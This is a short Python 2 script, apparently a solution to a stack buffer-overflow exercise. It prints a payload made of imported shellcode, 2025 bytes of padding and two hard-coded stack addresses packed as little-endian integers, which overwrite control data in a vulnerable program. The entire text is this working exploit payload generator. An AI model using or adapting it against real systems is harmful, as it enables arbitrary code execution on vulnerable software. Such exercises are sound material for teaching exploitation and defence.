from shellcode import shellcode
from struct import pack

print shellcode+"0"*2025+pack("<I", 0xbffea638)+pack("<I", 0xbffeae4c)
